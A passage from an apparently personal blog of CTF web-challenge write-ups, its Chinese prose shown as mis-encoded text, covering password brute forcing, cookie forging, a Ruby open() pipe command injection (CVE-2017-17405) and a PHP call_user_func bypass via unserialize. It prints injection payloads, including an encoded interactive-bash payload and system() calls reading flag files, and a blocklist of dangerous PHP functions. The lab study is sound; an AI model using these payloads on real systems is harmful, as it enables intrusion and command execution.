class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="å‘½è¿çŸ³ä¹‹é—¨"><a href="#å‘½è¿çŸ³ä¹‹é—¨" class="headerlink" title="å‘½è¿çŸ³ä¹‹é—¨"></a>å‘½è¿çŸ³ä¹‹é—¨</h2><p>è¿›å»å°±æ˜¯éªŒè¯å¯†ç  ctrl+uå‘ç°æç¤º <code>5pyJ5pe25YCZ77yM6aqM6K+B56CB5piv5ZCm5aW95L2/5LiN6YeN6KaB</code></p>
<p><img src="/images/image-20250629163439476.png" alt="image-20250629163439476"></p>
<p>ç„¶ådirsearchæ‰«æå‘ç° passwrod.txt ç›´æ¥burpå¼€çˆ† éªŒè¯ç è¯´æ˜¯ä¸é‡è¦ éšä¾¿å¡« ç»“æœè¿˜æ˜¯è¦çŒœä¸‡èƒ½éªŒè¯ç 0000 ç›´æ¥è¿›ç¬¬äºŒæ­¥</p>
<p>è¿˜æ˜¯çˆ†å¯†ç  å­—å…¸æ˜¯æ‹¿åˆ°çš„password.txtå†…å®¹ çˆ†å‡ºæ¥å¯†ç æ˜¯ huan9le1Sam0</p>
<p>ç›´æ¥è¿‡äººæœºéªŒè¯å³å¯å¾—åˆ°flag</p>
<h2 id="ä½ ä¹Ÿç©é“²å—"><a href="#ä½ ä¹Ÿç©é“²å—" class="headerlink" title="ä½ ä¹Ÿç©é“²å—"></a>ä½ ä¹Ÿç©é“²å—</h2><p>é¦–å…ˆå…ˆæ³¨å†Œ ç™»é™†è¿›å»çœ‹åˆ°ctrl+uçœ‹åˆ°æç¤º</p>
<p><img src="/images/image-20250629171713533.png" alt="image-20250629171713533"></p>
<p>dirsearchæ‰«æ æ‰«æå‡ºæ¥å¥½å‡ ä¸ªæ•æ„Ÿè·¯å¾„</p>
<p><img src="/images/image-20250629171750702.png" alt="image-20250629171750702"></p>
<p>è®¿é—®&#x2F;login_admin.html çœ‹åˆ°ç®¡ç†å‘˜ç™»å½•ç•Œé¢ ç»“åˆæç¤º ä¼ªé€ cookie</p>
<p><img src="/images/image-20250629172110963.png" alt="image-20250629172110963"></p>
<p>ä¿®æ”¹cookieå¦‚ä¸‹å›¾</p>
<p><img src="/images/image-20250629172143965.png" alt="image-20250629172143965"></p>
<p>å†å»è®¿é—®admin_login.php</p>
<p><img src="/images/image-20250629171518524.png" alt="image-20250629171518524"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/09/BUU-%E5%88%B7%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/06/09/BUU-%E5%88%B7%E9%A2%98/" class="post-title-link" itemprop="url">webåˆ·é¢˜â€”â€”æŒç»­æ›´æ–°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-06-09 17:20:58" itemprop="dateCreated datePublished" datetime="2025-06-09T17:20:58+08:00">2025-06-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-06-10 15:14:23" itemprop="dateModified" datetime="2025-06-10T15:14:23+08:00">2025-06-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ç¬¬äº”ç©ºé—´-2021-PNGå›¾ç‰‡è½¬æ¢å™¨"><a href="#ç¬¬äº”ç©ºé—´-2021-PNGå›¾ç‰‡è½¬æ¢å™¨" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨"></a>[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨</h2><p>æœ‰æºç ï¼Œrubyå†™çš„ï¼Œä¸æ˜¯å¸¸è§çš„è¯­è¨€é¦–å…ˆè”æƒ³cveï¼Œå…ˆçœ‹æºç ã€‚</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:MD5</span>.hexdigest(<span class="title class_">Time</span>.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |<span class="params">f</span>|</span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + <span class="title class_">Base64</span>.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>åšäº†ä¸¤ä¸ªåŠŸèƒ½ç‚¹ï¼Œuploadå’Œconvertã€‚å®¡è®¡ä¸‹æ¥é™åˆ¶çš„å¾ˆæ­»ï¼Œå”¯ä¸€åˆ©ç”¨ç‚¹å°±æ˜¯openè¿™æ¯”è¾ƒå¯ç–‘ï¼Œè€ƒè™‘cveï¼Œrubyç»“åˆopenæœç„¶æœ‰cveã€‚</p>
<p>å‚è€ƒCVE-2017-17405</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Ruby-NetFTP-%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2017-17405.md">https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Ruby-NetFTP-%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2017-17405.md</a></p>
<p>åŸç†:</p>
<p>Ruby-Net::FTP æ¨¡å—æ˜¯ä¸€ä¸ªFTPå®¢æˆ·ç«¯ï¼Œä¸Šä¼ æ–‡ä»¶è¿‡ç¨‹ä¸­ä½¿ç”¨äº†openå‡½æ•°ã€‚openå‡½æ•°åœ¨rubyä¸­æ˜¯å€Ÿç”¨ç³»ç»Ÿå‘½ä»¤æ¥æ‰“å¼€æ–‡ä»¶ï¼Œæ„å‘³ç€å¦‚æœæ²¡æœ‰åšè¿‡æ»¤ï¼Œæˆ‘ä»¬èƒ½åˆ©ç”¨è¿™ä¸ªç‚¹æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>payload:</p>
<p>å¦‚æœ+path+ä»¥ä¸€ä¸ªç®¡é“å­—ç¬¦ï¼ˆ<code>|</code>ï¼‰å¼€å¤´ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œé€šè¿‡ä¸€å¯¹ç®¡é“è¿æ¥åˆ°è°ƒç”¨è€…ã€‚ è¿”å›çš„IOå¯¹è±¡å¯ç”¨äºå‘è¯¥å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥å†™å…¥å’Œä»æ ‡å‡†è¾“å‡ºè¯»å–ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file=|bash -c env #.png</span><br><span class="line">file=|`echo ZW52|base64 -d` &gt; e7e7eed2fbf6094265aebdf5344bfb8c.png</span><br><span class="line">file=|bash$&#123;IFS&#125;-c$&#123;IFS&#125;&#x27;&#123;echo,YmFzaCAtaSA...&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>è¿›å»æ²¡æ‰¾åˆ°ä»€ä¹ˆåˆ©ç”¨ç‚¹ï¼Œdirsearchæ‰«æï¼Œæœ‰robots.txt è®¿é—®å¾—åˆ°user.php.bak</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>è¿›å»å°±æ˜¯ä¸€å¼ è´´è„¸å¤§å›¾ éšä¾¿æŠ“åŒ…çœ‹åˆ°å‚æ•° éšä¾¿è¾“å‘ç° call_user_funè¿™ä¸ªè¶…æ˜æ˜¾çš„phpå‡½æ•°</p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250608193444974.png" alt="image-20250608193444974"></p>
<p>é¦–å…ˆä½¿ç”¨file_get_contentsç»“åˆä¼ªåè®®è¯»å–æºç  </p>
<p>(è¯»æºç ä¸æ­¢ä¸€ä¸ªæ–¹æ³• è¿˜æœ‰fun&#x3D;highlight_file&amp;p&#x3D;index.php)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸¤ä¸ªæ–¹æ³•:</p>
<h3 id="æ–¹æ³•1ï¼šunserilizeååºåˆ—åŒ–"><a href="#æ–¹æ³•1ï¼šunserilizeååºåˆ—åŒ–" class="headerlink" title="æ–¹æ³•1ï¼šunserilizeååºåˆ—åŒ–"></a>æ–¹æ³•1ï¼šunserilizeååºåˆ—åŒ–</h3><p>__destruc__é­”æœ¯æ–¹æ³•å½“ç±»è¢«é”€æ¯ä¼šè‡ªåŠ¨è§¦å‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =  <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250609130147665.png" alt="image-20250609130147665"></p>
<p>çœ‹åˆ°å¯ç–‘è·¯å¾„ &#x2F;tmp&#x2F;flagoefiu4r93</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =  <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—é“flag</p>
<h3 id="æ–¹æ³•2ï¼šå‘½åç©ºé—´æ–¹æ³•"><a href="#æ–¹æ³•2ï¼šå‘½åç©ºé—´æ–¹æ³•" class="headerlink" title="æ–¹æ³•2ï¼šå‘½åç©ºé—´æ–¹æ³•"></a>æ–¹æ³•2ï¼šå‘½åç©ºé—´æ–¹æ³•</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>åœ¨phpä¸­ï¼Œå‡½æ•°åŠ ä¸Š\å·ä¸ä¼šå½±å“å‡½æ•°æœ¬èº«ï¼Œå› ä¸ºin_arrayå‡½æ•°è¿‡æ»¤ä¸å¤Ÿä¸¥è°¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŠ ä¸Š\å·æ¥ç»•è¿‡ã€‚</p>
<p>func&#x3D;\system&amp;p&#x3D;find &#x2F; -name fllag*</p>
<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20250609131040803.png" alt="image-20250609131040803"></p>
<p>ç„¶åæ­£å¸¸æ‰§è¡Œå‘½ä»¤å°±è¡Œ </p>
<h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = 